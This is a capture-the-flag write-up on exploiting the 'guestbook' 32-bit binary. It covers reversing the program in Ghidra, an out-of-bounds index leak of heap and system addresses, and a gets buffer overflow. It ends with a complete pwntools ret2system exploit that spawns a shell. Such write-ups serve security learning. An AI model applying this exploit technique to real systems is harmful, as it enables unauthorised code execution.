# guestbook

Noopnoop helped with the creation of this writeup.

Let's take a look at the binary:
```
$    file guestbook
guestbook: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bc73592d4897267cd1097b0541dc571d051a7ca0, not stripped
$    pwn checksec guestbook
[*] '/Hackery/tuctf/guestbook/guestbook'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So we can see that it is 32 bit elf, with a non executable stack and PIE enabled. Let's try running the binary:

```
$    ./guestbook
Please setup your guest book:
Name for guest: #0
>>>00000
Name for guest: #1
>>>11111
Name for guest: #2
>>>22222
Name for guest: #3
>>>33333
---------------------------
1: View name
2: Change name
3. Quit
>>2
Which entry do you want to change?
>>>1
Enter the name of the new guest.
>>>15935

---------------------------
1: View name
2: Change name
3. Quit
>>1
Which entry do you want to view?
>>>1
15935
---------------------------
1: View name
2: Change name
3. Quit
>>1
Which entry do you want to view?
>>>6
@RW(DRW@DRWXDRW�I[
`T�
    ���XDRW
---------------------------
1: View name
2: Change name
3. Quit
>>3
```

So it prompts us for four names, then provides us the ability to change or view the names. It appears that when we view the name of something past the four names we have, we get an infoleak. Let's take a look at the code in Ghidra:

## Reversing

Looking at the main function in Ghidra, we see this:

```

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  char *ptr;
  int iVar1;
  char changeNameInput [100];
  int changeIndex;
  int menuChoice;
  char *ptrArray [4];
  undefined *systemVar;
  int i;
  bool continue;
 
  setvbuf(stdout,(char *)0x0,2,0x14);
  puts("Please setup your guest book:");
  i = 0;
  while (i < 4) {
    printf("Name for guest: #%d\n>>>",i);
    ptr = (char *)malloc(0xf);
    __isoc99_scanf(&DAT_00010ac3,ptr);
    ptr[0xe] = 0;
    ptrArray[i] = ptr;
    i = i + 1;
  }
  continue = true;
LAB_000109b3:
  do {
    if (!continue) {
      return 0;
    }
    do {
      iVar1 = getchar();
      if ((char)iVar1 == '\n') break;
    } while ((char)iVar1 != -1);
    puts("---------------------------");
    puts("1: View name");
    puts("2: Change name");
    puts("3. Quit");
    printf(">>");
    menuChoice = 0;
    __isoc99_scanf(&DAT_00010a75,&menuChoice);
    if (menuChoice != 2) {
      if (menuChoice == 3) {
        continue = false;
      }
      else {
        if (menuChoice == 1) {
          readName((int)ptrArray);
        }
        else {
          puts("Not a valid option. Try again");
        }
      }
      goto LAB_000109b3;
    }
    printf("Which entry do you want to change?\n>>>");
    changeIndex = -1;
    __isoc99_scanf(&DAT_00010a75,&changeIndex);
    if (changeIndex < 0) {
      puts("Enter a valid number");
    }
    else {
      printf("Enter the name of the new guest.\n>>>");
      do {
        iVar1 = getchar();
        if ((char)iVar1 == '\n') break;
      } while ((char)iVar1 != -1);
      gets(changeNameInput);
      strcpy(ptrArray[changeIndex],changeNameInput);
    }
  } while( true );
}
```

Starting off, we can see it allocates four `0xf` byte chunks in the heap, and prompts us to scan in data (the four guest names). It also saves the pointers in the array  `ptrArray`. Proceeding that, we are dropped into a menu where we can either change a name, view a name, or exit. If we choose to view a name, the `readName` function is executed:

```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void readName(int ptrArray)

{
  int index;
 
  printf("Which entry do you want to view?\n>>>");
  index = -1;
  __isoc99_scanf(&DAT_00010a75,&index);
  if (index < 0) {
    puts("Enter a valid number");
  }
  else {
    puts(*(char **)(ptrArray + index * 4));
  }
  return;
}
```

So we can see that it prompts us for an index to the array of pointers that it is passed, and it passes that pointer to `puts`. The only check is to make sure that the index it gets is greater than `0`, however there is no check to ensure that we don't print a pointer past the end of the array. This is an index check bug.

Looking at the code for editing a guest's name, we see it has the same index bug:

```
  __isoc99_scanf(&DAT_00010a75,&changeIndex);
    if (changeIndex < 0) {
      puts("Enter a valid number");
    }
```

In addition to that, we can see that there is another bug:

```
      gets(changeNameInput);
      strcpy(ptrArray[changeIndex],changeNameInput);
```

We can see that there is a call to `gets`, so we have a buffer overflow vulnerability. However before that happens, there is a `strcpy` call that uses a pointer which will be overwritten in the overflow (when we look at the stack, we see that it is between the start of our input and the return address). We will need an infoleak to leak a pointer which we can use in the overflow.

In addition to that, because PIE is enabled, the address of `system` (which is imported into the program) should change every time. We will need to get the address of `system` in order to execute a return to `system` attack. Also another thing to take note of, it saves the address of `system` in a stack variable (although for some reason, it isn't showing in the disassembly):

```
        00010857 89 45 ec        MOV        dword ptr [EBP + local_18],ptr
        0001085a 8b 83 e8        MOV        ptr,dword ptr [0xffffffe8 + EBX]=>->system       = 00013020
                 ff ff ff
        00010860 89 45 e8        MOV        dword ptr [EBP + systemVar],ptr=>system          = ??
```

## Exploitation

Our exploit will have two parts. The first is we will use the `readName` function to get an infoleak to both the heap and the libc. The second part will be using the `gets` call to overwrite the return address and get code execution:

#### Infoleak

Let's take a look at the layout of the memory in gdb:

```
gef➤  r
Starting program: /Hackery/pod/modules/ret_2_system/tu_guestbook/guestbook
Please setup your guest book:
Name for guest: #0
>>>15935728
Name for guest: #1
>>>75395128
Name for guest: #2
>>>95135728
Name for guest: #3
>>>35715928
---------------------------
1: View name
2: Change name
3. Quit
>>^C
Program received signal SIGINT, Interrupt.
0xf7fd3939 in __kernel_vsyscall ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfffffe00
$ebx   : 0x0       
$ecx   : 0x56558180  →  "35715928"
$edx   : 0x400     
$esp   : 0xffffc998  →  0xffffca10  →  0xffffd070  →  0xffffd138  →  0x00000000
$ebp   : 0xffffca10  →  0xffffd070  →  0xffffd138  →  0x00000000
$esi   : 0xf7fb45c0  →  0xfbad2288
$edi   : 0x0       
$eip   : 0xf7fd3939  →  <__kernel_vsyscall+9> pop ebp
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffffc998│+0x0000: 0xffffca10  →  0xffffd070  →  0xffffd138  →  0x00000000  ← $esp
0xffffc99c│+0x0004: 0x00000400
0xffffc9a0│+0x0008: 0x56558180  →  "35715928"
0xffffc9a4│+0x000c: 0xf7ec5807  →  0xfff0003d ("="?)
0xffffc9a8│+0x0010: 0x00000001
0xffffc9ac│+0x0014: 0x00000001
0xffffc9b0│+0x0018: 0xf7e515f9  →  <_IO_doallocbuf+9> add ebx, 0x162a07
0xffffc9b4│+0x001c: 0xf7fb45c0  →  0xfbad2288
─────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fd3933 <__kernel_vsyscall+3> mov    ebp, esp
   0xf7fd3935 <__kernel_vsyscall+5> sysenter
   0xf7fd3937 <__kernel_vsyscall+7> int    0x80
 → 0xf7fd3939 <__kernel_vsyscall+9> pop    ebp
   0xf7fd393a <__kernel_vsyscall+10> pop    edx
   0xf7fd393b <__kernel_vsyscall+11> pop    ecx
   0xf7fd393c <__kernel_vsyscall+12> ret    
   0xf7fd393d                  nop    
   0xf7fd393e                  nop    
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "guestbook", stopped, reason: SIGINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fd3939 → __kernel_vsyscall()
[#1] 0xf7ec5807 → read()
[#2] 0xf7e505a0 → _IO_file_underflow()
[#3] 0xf7e516fc → _IO_default_uflow()
[#4] 0xf7e2ba64 → add esp, 0x10
[#5] 0xf7e2a6c5 → __isoc99_scanf()
[#6] 0x565558e3 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[heap]'(0x56558000-0x5657a000), permission=rw-
  0x56558160 - 0x56558168  →   "15935728"
gef➤  search-pattern 0x56558160
[+] Searching '\x60\x81\x55\x56' in memory
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffd10c - 0xffffd11c  →   "\x60\x81\x55\x56[...]"
gef➤  x/20w 0xffffd10c
0xffffd10c: 0x56558160  0x56558590  0x565585b0  0x565585d0
0xffffd11c: 0xa5559f1 0xf7e1ac00  0xffffd10c  0x565585d0
0xffffd12c: 0x1000000 0x4 0x0 0x0
0xffffd13c: 0xf7df6751  0x1 0xffffd1d4  0xffffd1dc
0xffffd14c: 0xffffd164  0x1 0x0 0xf7fb4000
gef➤  x/s 0x56558590
0x56558590: "75395128"
gef➤  x/s 0x565585b0
0x565585b0: "95135728"
gef➤  x/s 0x565585d0
0x565585d0: "35715928"
gef➤  x/i 0xf7e1ac00
   0xf7e1ac00 <system>: call   0xf7f1568d
gef➤  x/w 0xffffd10c
0xffffd10c: 0x56558160
```

So we can see our array of heap pointers. After it, we see an interesting pointer at `0xffffd124` that points to the beginning of our array of heap pointers. We can reach this using the index check bug in `readName` (index `6`), so we can leak a heap pointer with this. What is interesting is if we do that, we will also get a libc infoleak bug.

The function `puts` will only stop printing until it reaches a null byte. Looking at the memory, we can see that there are no null bytes in between the start if the array of heap pointers, and the address of `system`. Thus if we print the address `xffffd10c` with puts in this scenario, we will also get the address of `system` due to the lack of null bytes. With that we get both a heap infoleak, and a libc infoleak to `system`.

#### Buffer Overflow

So for the buffer overflow, we will use `gets` to overwrite the return address. However we will need to overwrite a pointer that is written to with `strcpy`. Let's take a look at the stack layout:

```
  char *ptr;
  int iVar1;
  char changeNameInput [100];
  int changeIndex;
  int menuChoice;
  char *ptrArray [4];
  undefined *systemVar;
  int i;
  bool continue;
```

So we can see that the offset between the start of our input (located in `changeNameInput`) and the start of the array of pointers (located in `ptrArray`) is `0x6c` (`100 + 4 + 4 = 0x6c`). So if we go to edit the first pointer in the array while using the `gets` bug, then we will just have to place a heap pointer to memory that when written to won't cause a crash at offset `0x6c`.

Proceeding that, we need to find the offset from the start of our input in gets to the return address.


Set a breakpoint for the `strcpy` call:
```
gef➤  pie b *0x994
gef➤  pie run
Stopped due to shared library event (no libraries added or removed)
Please setup your guest book:
Name for guest: #0
>>>15935728
Name for guest: #1
>>>75395128
Name for guest: #2
>>>35715928
Name for guest: #3
>>>95135728
---------------------------
1: View name
2: Change name
3. Quit
>>2
Which entry do you want to change?
>>>0
Enter the name of the new guest.
>>>0000000000

Breakpoint 1, 0x56555994 in main ()
[+] base address 0x56555000
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0x56558160  →  "15935728"
$ebx   : 0x56557000  →  0x00001ef0
$ecx   : 0xf7fb45c0  →  0xfbad2288
$edx   : 0xffffd0a0  →  "0000000000"
$esp   : 0xffffd098  →  0x56558160  →  "15935728"
$ebp   : 0xffffd138  →  0x00000000
$esi   : 0xf7fb4000  →  0x001dbd6c
$edi   : 0xf7fb4000  →  0x001dbd6c
$eip   : 0x56555994  →  <main+466> call 0x56555570 <strcpy@plt>
$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffffd098│+0x0000: 0x56558160  →  "15935728"  ← $esp
0xffffd09c│+0x0004: 0xffffd0a0  →  "0000000000"
0xffffd0a0│+0x0008: "0000000000"
0xffffd0a4│+0x000c: "000000"
0xffffd0a8│+0x0010: 0xf7003030 ("00"?)
0xffffd0ac│+0x0014: 0x000000c2
0xffffd0b0│+0x0018: 0x00000000
0xffffd0b4│+0x001c: 0x00c10000
─────────────────────────────────────────────────────────────── code:x86:32 ────
   0x5655598c <main+458>       lea    edx, [ebp-0x98]
   0x56555992 <main+464>       push   edx
   0x56555993 <main+465>       push   eax
 → 0x56555994 <main+466>       call   0x56555570 <strcpy@plt>
   ↳  0x56555570 <strcpy@plt+0>   jmp    DWORD PTR [ebx+0x18]
      0x56555576 <strcpy@plt+6>   push   0x18
      0x5655557b <strcpy@plt+11>  jmp    0x56555530
      0x56555580 <malloc@plt+0>   jmp    DWORD PTR [ebx+0x1c]
      0x56555586 <malloc@plt+6>   push   0x20
      0x5655558b <malloc@plt+11>  jmp    0x56555530
─────────────────────────────────────────────────────── arguments (guessed) ────
strcpy@plt (
   [sp + 0x0] = 0x56558160 → "15935728",
   [sp + 0x4] = 0xffffd0a0 → "0000000000"
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "guestbook", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56555994 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 0000000000
[+] Searching '0000000000' in memory
[+] In '[heap]'(0x56558000-0x5657a000), permission=rw-
  0x56558180 - 0x5655818a  →   "0000000000"
[+] In '/usr/lib/i386-linux-gnu/libc-2.29.so'(0xf7f45000-0xf7fb1000), permission=r--
  0xf7f57c04 - 0xf7f57c14  →   "0000000000000000"
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffd0a0 - 0xffffd0aa  →   "0000000000"
gef➤  i f
Stack level 0, frame at 0xffffd140:
 eip = 0x56555994 in main; saved eip = 0xf7df6751
 Arglist at 0xffffd138, args:
 Locals at 0xffffd138, Previous frame's sp is 0xffffd140
 Saved registers:
  ebx at 0xffffd134, ebp at 0xffffd138, eip at 0xffffd13c
```

and we cans ee that the offset is `0x9c`:
```
>>> hex(0xffffd13c - 0xffffd0a0)
'0x9c'
```

So there we can place the address of `system`. Four bytes after that, we will just place a ptr to the libc address for the string `/bin/sh` (since that is where it will expect it's input).

## Exploit

Putting it all together, we get the following exploit:

```
# noopnoop helped with this exploit

# Import pwntools
from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']

# Establish the target process, and hand it over to gdb
target = process('./guestbook', env={"LD_PRELOAD":"./libc.so.6"})
gdb.attach(target)

# Establish the function which will create the first four names
def start():
    print target.recvuntil(">>>")
    target.sendline("15935")
    print target.recvuntil(">>>")
    target.sendline("75395")
    print target.recvuntil(">>>")
    target.sendline("01593")
    print target.recvuntil(">>>")
    target.sendline("25319")


# Create the function which will calculate the address of /bin/sh from the address of system, since they are both in libc
def calc_binsh(system_adr):
    binsh = system_adr + 0x120c6b
    log.info("The address of binsh is: " + hex(binsh))
    return binsh

# Create the function which will create the payload and send it
def attack(system, binsh, heap):
    target.sendline("2")
    print target.recvuntil(">>>")
    target.sendline("0")
    print target.recvuntil(">>>")
    payload = "0"*0x4 + "\x00" + "1"*0x5f + p32(0x0) + "2"*0x4 + p32(heap) + "3"*0x2c + p32(system) + "4"*0x4 + p32(binsh)
    target.sendline(payload)

# Run the start function
start()

# Get the infoleak, for the address of system and the address of the heap space for the first name
print target.recvuntil(">>")
target.sendline("1")
print target.recvuntil(">>>")
target.sendline("6")
leak = target.recv(24)
print target.recvuntil(">>")
system_adr = u32(leak[20:24])
heap_adr = u32(leak[0:4])
log.info("The address of system is: " + hex(system_adr))
log.info("The address of heap is: " + hex(heap_adr))

# Calculate the address of /bin/sh
binsh = calc_binsh(system_adr)

# Launch the attack
attack(system_adr, binsh, heap_adr)

# Drop to an interactive shell
target.interactive()
```

When we run it:

```
➜  /vagrant git:(master) ✗ python exploit.py.2
[+] Starting local process './guestbook': pid 2717
[*] running in new terminal: /usr/bin/gdb -q  "./guestbook" 2717 -x "/tmp/pwnDgnK2m.gdb"
[+] Waiting for debugger: Done
Please setup your guest book:
Name for guest: #0
>>>
Name for guest: #1
>>>
Name for guest: #2
>>>
Name for guest: #3
>>>
---------------------------
1: View name
2: Change name
3. Quit
>>
Which entry do you want to view?
>>>
l\xffX\xb0uV
---------------------------
1: View name
2: Change name
3. Quit
>>
[*] The address of system is: 0xf7546da0
[*] The address of heap is: 0x5675a008
[*] The address of binsh is: 0xf7667a0b
Which entry do you want to change?
>>>
Enter the name of the new guest.
>>>
[*] Switching to interactive mode
$
---------------------------
1: View name
2: Change name
3. Quit
>>$ 3
$ w
 04:35:38 up  1:04,  1 user,  load average: 0.08, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         Mon02    2.00s  0.24s  0.00s tmux
$
```

Just like that, we popped a shell!